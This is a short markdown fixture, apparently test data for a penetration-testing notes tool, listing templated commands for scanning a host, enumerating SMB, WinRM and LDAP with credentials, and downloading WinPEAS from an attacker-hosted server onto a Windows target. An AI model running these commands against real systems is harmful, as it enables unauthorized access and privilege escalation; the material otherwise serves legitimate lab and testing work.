---
title: Workflow commands
order: 1
tags: [fixture]
---

## Scan the target

```bash
nmap -sV {{RHOST}}
```

## Identify the domain

```bash
nxc smb {{RHOST}}
```

## SMB shares

```bash
nxc smb {{RHOST}} -d '{{DOMAIN}}' -u '{{USER}}' -p '{{PASS}}' --shares
```

## WinRM access

```bash
nxc winrm {{RHOST}} -d '{{DOMAIN}}' -u '{{USER}}' -p '{{PASS}}'
```

## LDAP users

```bash
nxc ldap {{DC}} -d '{{DOMAIN}}' -u '{{USER}}' -p '{{PASS}}' --users
```

## Host WinPEAS on Kali

```bash
cd /home/kali/tools/binaries
python3 -m http.server 8000
```

## Download WinPEAS in PowerShell

```powershell
iwr -UseBasicParsing -Uri 'http://{{LHOST}}:8000/winPEASx64.exe' -OutFile '.\winPEASx64.exe'
```
